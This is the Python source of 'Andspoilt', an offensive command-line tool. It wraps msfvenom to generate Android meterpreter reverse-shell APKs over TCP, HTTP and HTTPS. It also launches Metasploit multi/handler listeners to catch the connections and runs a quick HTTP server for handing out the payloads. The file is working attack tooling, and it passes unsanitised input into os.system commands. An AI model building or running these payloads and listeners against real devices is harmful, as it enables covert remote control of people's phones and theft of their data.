#!/usr/bin/python

import os
import sys, traceback
import subprocess
#import argparse
from src import banner

def main():
	try:
		banner.banner()
		def splash():
			while True:
				print ('''
1) Create Android apk payload
2) Pwn a shell
3) Update Andspoilt
4) Credits and About
5) Help
6) Exit Andspoilt
			''')
			
				dark = raw_input("\033[1;36muse > \033[1;m")

				while dark == "1":
					print ('''
1) Android-meterpreter-staged-reverse-tcp
2) Android-meterpreter-reverse-http
3) Android-meterpreter-reverse-https
4) Start SimpleHTTPServer for quick file transfer

Use "back" to navigate to previous commands
					''')

					user_command = raw_input("\033[1;32mChoose Command > \033[1;m")
					if user_command == "1":
						lhost = raw_input("\033[1;32mInput your IP address > \033[1;m")
						lport = raw_input("\033[1;32mInput the PORT > \033[1;m")
						name = raw_input("\033[1;32mEnter the output name > \033[1;m")
						os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST="' + lhost + '" LPORT="' + lport + '" -o /root/Desktop/' + name)
						listen = raw_input("\033[1;32mDo you wish to start the listener now?(y/n) > \033[1;m")
						if listen == 'yes' or listen =='y':
							os.system("service postgresql start && msfdb start")
							os.system("msfconsole  -q -x 'use exploit/multi/handler/; set payload android/meterpreter/reverse_tcp; set LPORT " + lport + "; set LHOST " + lhost + "; run -j'")
						else:
							os.system("clear")
							banner.banner()
							splash()

					elif user_command == "2":
						lhost = raw_input("\033[1;32mInput your IP address > \033[1;m")
						lport = raw_input("\033[1;32mInput the PORT > \033[1;m")
						name = raw_input("\033[1;32mEnter the output name > \033[1;m")
						os.system('msfvenom -p android/meterpreter/reverse_http LHOST="' + lhost + '" LPORT="' + lport + '" -o /root/Desktop/' + name)
						listen = raw_input("\033[1;32mDo you wish to start the listener now?(y/n) > \033[1;m")
						if listen == 'yes' or listen =='y':
							os.system("msfdb start && service postgresql start")
							os.system("msfconsole  -q -x 'use exploit/multi/handler/; set payload android/meterpreter/reverse_http; set LPORT " + lport + "; set LHOST " + lhost + "; run -j'")
						else:
							os.system("clear")
							banner.banner()
							splash()
					elif user_command == "3":
						lhost = raw_input("\033[1;32mInput your IP address > \033[1;m")
						lport = raw_input("\033[1;32mInput the PORT > \033[1;m")
						name = raw_input("\033[1;32mEnter the output name > \033[1;m")
						os.system('msfvenom -p android/meterpreter/reverse_https LHOST="' + lhost + '" LPORT="' + lport + '" -o /root/Desktop/' + name)
						listen = raw_input("\033[1;32mDo you wish to start the listener now?(y/n) > \033[1;m")
						if listen == 'yes' or listen =='y':
							os.system("msfdb start && service postgresql start")
							os.system("msfconsole  -q -x 'use exploit/multi/handler/; set payload android/meterpreter/reverse_https; set LPORT " + lport + "; set LHOST " + lhost + "; run -j'")
						else:
							os.system("clear")
							banner.banner()
							splash()

					elif user_command == "back":
						splash()
					elif user_command == "gohome":
						splash()
					elif user_command == "4":
						cmd4 = os.system("python2 -m SimpleHTTPServer 8080")
					elif user_command == "exit":
						sys.exit("Killed the program")

					else:
						print ("\033[1;31mWrong Command choosen!\033[1;m")


				if dark == "3":
					cwdpath = os.getcwd()
					subprocess.Popen("%s/src/update.sh" % cwdpath, shell=True).wait()

				def blue():
					while dark == "2":
						print ('''
\033[1;35m
[***]Pwning a shell[***]
\033[1;m

1) Start Android-meterpreter-staged-reverse-tcp listener
2) Start Android-meterpreter-reverse-http listener
3) Start Android-meterpreter-reverse-https listener
4) Access Root
5) Enumerate SipDroid

Use "back" to navigate to previous commands

			 ''')
						ignition = raw_input("\033[1;36mIgnite > \033[1;m")
						if ignition == "back":
							splash()
						elif ignition == "1":
							lhost = raw_input("\033[1;32mInput your IP address > \033[1;m")
							lport = raw_input("\033[1;32mInput the PORT > \033[1;m")
							os.system("msfdb start && service postgresql start")
							os.system("msfconsole  -q -x 'use exploit/multi/handler/; set payload android/meterpreter/reverse_tcp; set LPORT " + lport + "; set LHOST " + lhost + "; run -j'")
							
						elif ignition == "2":
							lhost = raw_input("\033[1;32mInput your IP address > \033[1;m")
							lport = raw_input("\033[1;32mInput the PORT > \033[1;m")
							os.system("msfdb start && service postgresql start")
							os.system("msfconsole  -q -x 'use exploit/multi/handler/; set payload android/meterpreter/reverse_http; set LPORT " + lport + "; set LHOST " + lhost + "; run -j'")
							
						elif ignition == "3":
							lhost = raw_input("\033[1;32mInput your IP address > \033[1;m")
							lport = raw_input("\033[1;32mInput the PORT > \033[1;m")
							os.system("msfdb start && service postgresql start")
							os.system("msfconsole  -q -x 'use exploit/multi/handler/; set payload android/meterpreter/reverse_https; set LPORT " + lport + "; set LHOST " + lhost + "; run -j'")
							
							
						elif ignition == "exit":
							sys.exit()
						else:
							print ("\033[1;31mWrong Command choosen!\033[1;m")
				
					if dark == "4":
						banner.about()
					if dark == "5":
						banner.help()
					if dark == "6" or dark == 'exit':
						print("Exit Andspoilt")
						sys.exit(0)
					if dark == "show w" or dark == 'warranty':
						banner.warranty()
					if dark == "show c" or dark == 'copyright':
						banner.copyright()
					if dark == "banner" or dark == 'b':
						os.system("clear")
						banner.banner()

				blue()
		splash()
	except KeyboardInterrupt:
		print ("Andspoilt shutdown unexpectedly")
	except Exception:
		traceback.print_exc(file=sys.stdout)
	sys.exit(0)
if os.getuid():
	exit('You need to run Andspoilt as root')
if __name__ == "__main__":
    main()
